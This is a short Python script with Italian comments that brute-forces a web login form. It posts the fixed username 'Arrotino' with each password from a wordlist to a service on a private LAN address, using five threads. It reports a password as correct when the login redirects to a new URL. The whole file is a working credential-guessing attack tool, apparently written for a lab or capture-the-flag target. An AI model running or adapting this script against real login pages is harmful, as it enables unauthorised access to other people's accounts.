import requests
import threading
from queue import Queue
import sys

url = 'http://192.168.1.143:5000'

stop_threads = False

def worker(q):
    while True:
        password = q.get()
        try_password(password)
        q.task_done()

def try_password(password):
    data = {'username': 'Arrotino', 'password': password}
    response = requests.post(url, data=data)

    if response.status_code == 200:
        #print(f'Password "{password}" provata!')
        if response.url!='http://192.168.1.143:5000/':
            print(f'--- Questa è la password corretta "{password}"---')
            print(f'--- Questa è il nuovo url"{response.url}" ---')
           # print(response.text) # Stampa il contenuto HTML della pagina


f=open('./passwords.txt','r')
passwords = [line.strip() for line in f.readlines()]# Elenca tutte le password da provare
max_threads = 5  # Limite di thread attivi

# Crea una coda di lavoro
q = Queue()

# Aggiungi le password alla coda di lavoro
for password in passwords:
    q.put(password)

# Crea un insieme di thread
threads = []
for i in range(max_threads):
    t = threading.Thread(target=worker, args=(q,))
    t.start()
    threads.append(t)

# Attendi la fine della coda di lavoro
q.join()





